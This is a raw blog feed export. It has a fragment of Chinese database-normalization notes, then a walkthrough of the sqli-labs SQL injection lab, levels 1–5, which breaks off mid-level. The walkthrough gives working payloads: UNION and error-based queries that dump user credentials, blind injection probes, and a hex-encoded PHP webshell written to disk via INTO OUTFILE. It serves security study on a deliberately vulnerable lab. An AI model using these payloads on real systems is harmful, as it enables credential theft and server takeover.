style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>，都有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">X&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 不函数依赖于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，则称 Y 对 X 完全函数依赖，记作 —&gt;F</p><p>定义<strong> 6.3</strong>：传递函数依赖</p><h3 id="622-码"><a class="markdownIt-Anchor" href="#622-码">#</a> 6.2.2 码</h3><p>码是关系模式中的一个重要概念。</p><p><strong>定义 6.4</strong>：设 K 为 R&lt;U,F&gt; 中的属性或属性集合，若 U 完全依赖于 K，则 K 为 R 的<strong>候选码</strong>。</p><p>注意 U 是完全依赖于 K，而不是部分依赖于 K。一般地，<strong>如果 U 函数依赖于 K，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>→</mo><mi>U</mi></mrow><annotation encoding="application/x-tex">K \rightarrow U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span>，则 K 称为超码</strong>。候选码是一类特殊的超码，即候选码的超集（如果存在）一定是超码，候选码的任何真子集一定不是超码。</p><p>若候选码多于一个，则选定其中的一个为<strong>主码</strong>。</p><p>包含在任何一个候选码中的属性称为<strong>主属性</strong>；不包含在任何候选码中的属性称为<strong>非主属性</strong>或<strong>非码属性</strong>。最简单的情况，单个属性是码；最极端的情况，整个属性组是码，称为<strong>全码</strong>。</p><p><strong>定义 6.5</strong>：关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的<strong>外部码</strong>，也称<strong>外码</strong>。</p><h3 id="623-范式"><a class="markdownIt-Anchor" href="#623-范式">#</a> 6.2.3 范式</h3><p>关系数据库中的关系是要满足一定的要求的，满足不同程度要求的为不同范式。</p><p>一个低一级范式的关系模式通过模式分解可以转换为若干个高一级范式的关系模式的集合，这种过程就叫<strong>规范化</strong>。</p><h3 id="624-2nf"><a class="markdownIt-Anchor" href="#624-2nf">#</a> 6.2.4 2NF</h3><p><strong>定义 6.6</strong>：若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>∈</mo><mn>1</mn><mi>N</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">R\in 1NF</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span>，且每一个非主属性完全函数依赖于任何一个候选码，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>∈</mo><mn>2</mn><mi>N</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">R\in 2NF</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span>。</p><h2 id="63-数据依赖的公理系统"><a class="markdownIt-Anchor" href="#63-数据依赖的公理系统">#</a> 6.3 数据依赖的公理系统</h2><p>定义<strong> 6.11</strong>：对于满足一组函数依赖 F 的关系模式 R&lt;U,F&gt;，其任何一个关系 r，若函数依赖<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 都成立（即 r 中任意两元祖 t、s，若 t [X]=s [X]，则 t [X]=s [Y]），则称<strong> F 逻辑蕴含<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></strong>.</p><p><strong>公理系统</strong>设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;，对 R&lt;U,F &gt; 来说有以下的推理规则：</p><ul><li>A1 自反律</li><li>A2 增广率</li><li>A3 传递率</li></ul><p><strong>定义 6.13</strong>：设 F 为属性集 U 上的一组函数依赖，X、Y<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊆</span></span></span></span>U，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>X</mi><mi>F</mi><mo>+</mo></msubsup><mo>=</mo><mo stretchy="false">{</mo><mi>A</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo>→</mo><mi>A</mi><mtext>能由</mtext><mi>F</mi><mtext>根据</mtext><mi>A</mi><mi>r</mi><mi>m</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>n</mi><mi>g</mi><mtext>公理导出</mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">X^+_{F}=\{A|X \rightarrow A 能由F根据Armstrong 公理导出\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104993em;vertical-align:-0.293531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.4064690000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.293531em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">A</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">由</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">据</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">导</span><span class="mord cjk_fallback">出</span><span class="mclose">}</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>X</mi><mi>F</mi><mo>+</mo></msubsup></mrow><annotation encoding="application/x-tex">X^+_F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104993em;vertical-align:-0.293531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.4064690000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.293531em;"><span></span></span></span></span></span></span></span></span></span> 称为<strong>属性集 X 关于函数依赖集 F 的闭包</strong>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;61-问题的提出&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#61-问题的提出&quot;&gt;#&lt;/a&gt; 6.1 问题的提出&lt;/h2&gt;
&lt;p&gt;R(U,D,DOM,F)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系明 R 是符号化的元组语义&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="数据库" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs笔记</title>
    <link href="http://example.com/post/sqli-labs%E7%AC%94%E8%AE%B0.html"/>
    <id>http://example.com/post/sqli-labs%E7%AC%94%E8%AE%B0.html</id>
    <published>2022-06-07T06:44:48.000Z</published>
    <updated>2022-06-11T04:05:13.178Z</updated>
    
    <content type="html"><![CDATA[<p>测试上线使用</p><p>注意点：PHP 要使用低版本，高版本无法安装<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h2 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点">#</a> 相关知识点</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>信息收集知识点：</p><p>数据库版本：version () 5.7.22-0ubuntu0.16.04.1</p><p>数据库用户：user () root@localhost</p><p>数据库名字：database () mozhe_Discuz_StormGroup</p><p>操作系统：@@version_compile_os Linux</p><p>版本问题：5.1 以上是高版本，5 以下是低版本  （高版本和低版本的区别在于高版本有 information_schema，低版本没有）</p></blockquote><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>读写文件操作 (mysql 特有功能)</p><p>load_file (): 文件读取函数</p><p>into outfile 或 into dumpfile：导出函数</p><p>使用条件：secure_file_priv 为空（为空不是为 null），开启方法：在配置文件中添加</p></blockquote><h2 id="less-01"><a class="markdownIt-Anchor" href="#less-01">#</a> less 01</h2><ul><li>经过测试，闭合符号为单引号，注释使用 &quot;–+&quot;</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180042201.png" alt="image-20220523180042201"></p><ul><li>但是不知道为什么在通过 order 判断字段数的时候 #注释会有问题，用–+ 注释没有问题</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180210846.png" alt="image-20220523180210846"></p><ul><li>判断出字段共有三列，判断回显位置</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180255664.png" alt="image-20220523180255664"></p><ul><li>查询数据库和当前用户名</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180338390.png" alt="image-20220523180338390"></p><ul><li>以下为 payload，依次使用即可</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema = "security"--+ #爆破表名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name = "users" and table_schema = "security"--+ #爆破列名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+ #爆破数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523195305411.png" alt="image-20220523195305411"></p><h2 id="less-02"><a class="markdownIt-Anchor" href="#less-02">#</a> less 02</h2><ul><li>less 02 经测试为无引号包裹</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523195251870.png" alt="image-20220523195251870"></p><ul><li>测试字段数</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523183459282.png" alt="image-20220523183459282"></p><ul><li>信息收集</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523183547570.png" alt="image-20220523183547570"></p><ul><li>payload</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema="security"#  #获取表名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),user() from information_schema.columns where table_name="users" and table_schema="security"# #获取字段</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users# #获取数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523183959963.png" alt="image-20220523183959963"></p><h2 id="less-03"><a class="markdownIt-Anchor" href="#less-03">#</a> less 03</h2><ul><li>判断闭合方式为双引号</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523184413091.png" alt="image-20220523184413091"></p><ul><li>确定字段数时出现问题，发现后面有一个括号</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523184522961.png" alt="image-20220523184522961"></p><ul><li>经过尝试发现 id 的闭合方法应该为’)，注意注释方法要多试几次，不知道抽什么疯，payload:   <code>?id=1') order by 4-+</code></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523184909069.png" alt="image-20220523184909069"></p><ul><li>判断回显位置</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185018507.png" alt="image-20220523185018507"></p><ul><li>payload：</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,database(),user()--+ #信息收集</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(table_name),user() from information_schema.tables where table_schema = "security"--+ #查表</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(column_name),user() from information_schema.columns where table_name = "users" and table_schema = "security"--+ #获取字段名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+ #数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185333709.png" alt="image-20220523185333709"></p><h2 id="less-04"><a class="markdownIt-Anchor" href="#less-04">#</a> less 04</h2><ul><li>测试注入点，发现这里还是有一个括号干扰</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185810035.png" alt="image-20220523185810035"></p><ul><li>最终发现注入点的 payload 为： <code>http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) and 1=1--+</code></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185933398.png" alt="image-20220523185933398"></p><ul><li>判断字段数</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190217849.png" alt="image-20220523190217849"></p><ul><li>判断回显位置</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190236849.png" alt="image-20220523190236849"></p><ul><li>payload：</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,database(),user()--+ #信息收集</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,group_concat(table_name),user() from information_schema.tables where table_schema="security"--+ #获取表名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,group_concat(column_name),user() from information_schema.columns where table_name="users" and table_schema="security"--+ #获取列名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) from users--+ #获取数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190801049.png" alt="image-20220523190801049"></p><h2 id="less-05"><a class="markdownIt-Anchor" href="#less-05">#</a> less 05</h2><h4 id="1-布尔盲注使用left进行尝试"><a class="markdownIt-Anchor" href="#1-布尔盲注使用left进行尝试">#</a> 1、布尔盲注 —— 使用 left 进行尝试</h4><ul><li>利用 left 函数判断数据库版本。下面语句是判断版本的第一个字符是否是 5，发现正常返回结果，如果结果不正常是不能返回 you are in 的</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523192616884.png" alt="image-20220523192616884"></p><ul><li>使用 length 函数判断数据库名称的长度，发现到 8 时正常返回，说明数据库名称的长度为 8</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523192745236.png" alt="image-20220523192745236"></p><ul><li>使用 left 函数猜测数据库第一位，当试到 s 时正确显示，说明数据库名称的第一位是 s，继续测试出第二位是 e</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)="s"--+</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)="se"--+</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)>"se"--+ #使用ascii的值对字符进行判断</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523193121973.png" alt="image-20220523193121973"></p><h4 id="2-报错注入"><a class="markdownIt-Anchor" href="#2-报错注入">#</a> 2、报错注入</h4><ul><li>payload 如下，使用 updatexml 函数</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#获取当前数据库名称</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="token comment">#获取当前数据库所有表名称</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><span class="token comment">#获取当前数据库user表所有列名称</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+</span><span class="token comment">#获取当前数据库user表所有username和password的值</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+</span><span class="token comment">#下面这步写webshell</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e--+</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>本关为无回显注入</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190939410.png" alt="image-20220523190939410"></p><ul><li>判断闭合方式为单引号</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191042236.png" alt="image-20220523191042236"></p><ul><li>获取数据库</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select database()))))--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191242131.png" alt="image-20220523191242131"></p><ul><li>获取表名</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 